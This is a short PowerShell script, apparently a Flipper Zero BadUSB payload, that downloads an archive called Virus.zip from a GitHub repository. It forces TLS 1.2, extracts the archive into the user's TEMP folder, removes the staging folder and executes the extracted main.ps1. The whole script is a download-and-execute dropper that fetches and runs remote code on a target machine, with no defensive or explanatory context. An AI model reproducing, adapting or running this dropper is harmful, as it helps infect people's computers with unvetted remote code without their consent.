# Set the URL for the raw content of the zip file on GitHub
$zipUrl = "https://github.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/raw/main/Virus/Virus.zip"

# Specify the temporary folder for extracting
$tempFolder = "$env:TEMP\VirusTemp"

# Create the temporary folder if it doesn't exist
New-Item -ItemType Directory -Path $tempFolder -Force

# Specify the destination folder in temp
$Destination = "$env:TEMP"

# Force the use of TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Download the zip file using Invoke-WebRequest
$zipPath = Join-Path $tempFolder "Virus.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

# Extract the contents of the "Virus" folder to temp
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $Destination)

# Move the "Virus" folder contents to temp
Move-Item -Path (Join-Path $Destination "Virus\Virus\*") -Destination $Destination -Force

# Clean up the temporary folder
Remove-Item -Path $tempFolder -Recurse -Force

& "$env:TEMP\Virus\main.ps1"
